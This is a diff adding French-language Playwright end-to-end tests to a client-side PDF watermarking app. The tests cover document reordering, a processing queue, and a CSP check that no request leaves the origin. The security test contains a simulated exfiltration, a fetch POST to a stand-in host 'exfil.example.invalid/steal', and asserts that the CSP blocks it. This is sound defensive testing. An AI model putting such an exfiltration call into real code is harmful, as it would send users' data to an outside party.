@@ -163,3 +163,154 @@ describe("fumée : interface", () => {
     30_000
   );
 });
+
+describe("réordonner les documents", () => {
+  /** Noms des documents, dans l'ordre affiché. */
+  const order = (page: Page) =>
+    page.locator("li[data-doc-index] button[id^='doc-'] span.truncate").allTextContents();
+  /** Attend que l'ordre affiché devienne `expected` (re-rendu React asynchrone). */
+  async function orderBecomes(page: Page, expected: string[]) {
+    let last: string[] = [];
+    for (let i = 0; i < 40; i++) {
+      last = await order(page);
+      if (JSON.stringify(last) === JSON.stringify(expected)) return;
+      await page.waitForTimeout(50);
+    }
+    expect(last).toEqual(expected);
+  }
+
+  test(
+    "taper une position déplace le document ; glisser une ligne aussi",
+    async () => {
+      const t = STRINGS.fr;
+      const page = await openPage("/fr");
+      const pdf = Buffer.from(await makePdf([[200, 300]]));
+      await page.locator(`input[aria-label="${t.inputAria}"]`).setInputFiles(
+        ["a.pdf", "b.pdf", "c.pdf"].map((name) => ({ name, mimeType: "application/pdf", buffer: pdf }))
+      );
+      await page.locator("li[data-doc-index]").nth(2).waitFor();
+      expect(await order(page)).toEqual(["a.pdf", "b.pdf", "c.pdf"]);
+
+      // Saisie : « 1 » + Entrée envoie c.pdf en tête.
+      const position = page.locator(`input[aria-label="${t.positionOf("c.pdf", 3)}"]`);
+      await position.fill("1");
+      await position.press("Enter");
+      await orderBecomes(page, ["c.pdf", "a.pdf", "b.pdf"]);
+      // Hors limites : bornée à la dernière place.
+      await page.locator(`input[aria-label="${t.positionOf("c.pdf", 3)}"]`).fill("99");
+      await page.locator(`input[aria-label="${t.positionOf("c.pdf", 3)}"]`).press("Enter");
+      await orderBecomes(page, ["a.pdf", "b.pdf", "c.pdf"]);
+
+      // Glisser : la poignée de a.pdf lâchée sous la dernière ligne.
+      const handle = page.locator(`button[aria-label="${t.dragHandle("a.pdf")}"]`);
+      const from = (await handle.boundingBox())!;
+      const last = (await page.locator("li[data-doc-index]").nth(2).boundingBox())!;
+      await page.mouse.move(from.x + from.width / 2, from.y + from.height / 2);
+      await page.mouse.down();
+      await page.mouse.move(from.x + from.width / 2, last.y + last.height * 0.8, { steps: 12 });
+      await page.waitForTimeout(100); // une image d'animation : la cible est relue à chaque frame
+      await page.mouse.up();
+      await orderBecomes(page, ["b.pdf", "c.pdf", "a.pdf"]);
+
+      // Clavier : flèche haut sur la poignée.
+      await page.locator(`button[aria-label="${t.dragHandle("a.pdf")}"]`).press("ArrowUp");
+      await orderBecomes(page, ["b.pdf", "a.pdf", "c.pdf"]);
+    },
+    60_000
+  );
+});
+
+describe("file de traitement", () => {
+  test(
+    "ajouter un fichier pendant le rendu d'un long PDF ne le fait pas repartir de la page 1",
+    async () => {
+      const t = STRINGS.fr;
+      const page = await openPage("/fr");
+      await page.locator(`textarea[aria-label="${t.textareaAria}"]`).fill("Copie e2e");
+      const long = Buffer.from(await makePdf(Array.from({ length: 60 }, () => [595, 842] as [number, number])));
+      const input = page.locator(`input[aria-label="${t.inputAria}"]`);
+      await input.setInputFiles({ name: "long.pdf", mimeType: "application/pdf", buffer: long });
+
+      // Page en cours de long.pdf, lue dans sa pastille de progression.
+      const progress = () =>
+        page.evaluate(() => {
+          const row = [...document.querySelectorAll("li[data-doc-index], li")].find((li) =>
+            li.textContent?.includes("long.pdf")
+          );
+          const m = row?.textContent?.match(/(\d+)\s*\/\s*60/);
+          return m ? Number(m[1]) : 0;
+        });
+      for (let i = 0; i < 200 && (await progress()) < 5; i++) await page.waitForTimeout(50);
+      const before = await progress();
+      expect(before).toBeGreaterThanOrEqual(5);
+
+      await input.setInputFiles({
+        name: "court.pdf",
+        mimeType: "application/pdf",
+        buffer: Buffer.from(await makePdf([[200, 300]])),
+      });
+      let lowest = Infinity;
+      for (let i = 0; i < 30; i++) {
+        const p = await progress();
+        if (p > 0) lowest = Math.min(lowest, p);
+        await page.waitForTimeout(50);
+      }
+      expect(lowest).toBeGreaterThanOrEqual(before);
+    },
+    90_000
+  );
+});
+
+// Promesse « zéro transfert », vérifiée sous les en-têtes de production
+// (le serveur e2e rejoue out/_headers, voir helpers/server.ts).
+describe("sécurité : aucun octet ne quitte le navigateur", () => {
+  test(
+    "un filigrane complet ne contacte que l'origine, sans violation CSP ; une exfiltration est bloquée",
+    async () => {
+      const t = STRINGS.fr;
+      context = await browser.newContext({ serviceWorkers: "block" });
+      await context.addInitScript(MAP_UPSERT_POLYFILL);
+      await context.addInitScript(() => {
+        (window as any).__csp = [];
+        document.addEventListener("securitypolicyviolation", (e) =>
+          (window as any).__csp.push(`${e.violatedDirective} ${e.blockedURI}`)
+        );
+      });
+      const requests: string[] = [];
+      context.on("request", (r) => requests.push(r.url()));
+      const page = await context.newPage();
+      const response = await page.goto(`${E2E_ORIGIN}/fr`);
+      expect(response?.headers()["content-security-policy"]).toContain("connect-src 'self'");
+
+      await page
+        .locator(`input[aria-label="${t.inputAria}"]`)
+        .setInputFiles({
+          name: "confidentiel.pdf",
+          mimeType: "application/pdf",
+          buffer: Buffer.from(await makePdf([[200, 300]])),
+        });
+      await page.locator(`textarea[aria-label="${t.textareaAria}"]`).fill("Copie sécurité e2e");
+      await page.getByText(t.status.ready, { exact: true }).waitFor({ state: "visible", timeout: 30_000 });
+
+      const offOrigin = requests.filter(
+        (u) => !u.startsWith(`${E2E_ORIGIN}/`) && !u.startsWith("blob:") && !u.startsWith("data:")
+      );
+      expect(offOrigin).toEqual([]);
+      expect(await page.evaluate(() => (window as any).__csp)).toEqual([]);
+
+      // Un script injecté qui tenterait d'exfiltrer est arrêté par la CSP.
+      const exfil = await page.evaluate(async () => {
+        try {
+          await fetch("https://exfil.example.invalid/steal", { method: "POST", body: "x" });
+          return "envoyé";
+        } catch {
+          return "bloqué";
+        }
+      });
+      expect(exfil).toBe("bloqué");
+      await page.waitForFunction(() => (window as any).__csp.length > 0);
+      expect((await page.evaluate(() => (window as any).__csp))[0]).toStartWith("connect-src");
+    },
+    60_000
+  );
+});
